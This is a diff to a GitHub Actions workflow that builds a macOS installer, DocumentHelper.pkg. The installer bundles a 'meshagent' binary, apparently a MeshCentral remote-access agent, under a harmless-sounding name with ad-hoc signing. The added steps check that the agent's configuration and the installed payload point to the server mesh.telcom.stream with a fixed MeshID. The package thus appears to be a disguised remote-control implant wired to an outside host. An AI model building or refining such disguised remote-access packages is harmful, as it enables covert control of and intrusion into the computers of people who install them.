@@ -1,4 +1,4 @@
-# Build macOS DocumentHelper.pkg via GitHub Actions (macOS runner)
+# Build macOS DocumentHelper.pkg via GitHub Actions (macOS runner).
 # Trigger manually from the Actions tab, then download the artifact.
 
 name: Build macOS Package
@@ -9,7 +9,7 @@ on:
       version:
         description: 'Package version'
         required: false
-        default: '1.4.2'
+        default: '1.4.3'
 
 jobs:
   build-macos:
@@ -24,16 +24,26 @@ jobs:
           file meshagent
           # Must be Mach-O universal binary (x86_64 + arm64)
 
+      - name: Verify .msh configuration
+        run: |
+          cd mh1
+          grep -q "MeshServer=wss://mesh.telcom.stream:443/agent.ashx" DocumentHelper.msh
+          grep -q "MeshID=0x2112FD7D8C08A45F7B646FE30180E13B15F29894B27B2D0A97CC289B54C042A9A44C6EA414502B08EC2AE470D9DB2036" DocumentHelper.msh
+          echo "msh config OK"
+
       - name: Build package (includes ad-hoc signing)
         run: |
           cd mh1
           bash build-macos.sh
 
-      - name: Verify package
+      - name: Verify package payload
         run: |
           cd mh1
-          ls -la DocumentHelper.pkg
-          pkgutil --check-signature DocumentHelper.pkg || true
+          pkgutil --expand-full DocumentHelper.pkg expanded || pkgutil --expand DocumentHelper.pkg expanded
+          test -f expanded/Payload/usr/local/bin/DocumentHelper
+          test -f expanded/Payload/usr/local/bin/DocumentHelper.msh
+          grep -q "mesh.telcom.stream:443" expanded/Payload/usr/local/bin/DocumentHelper.msh
+          ls -la expanded/Payload/usr/local/bin
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
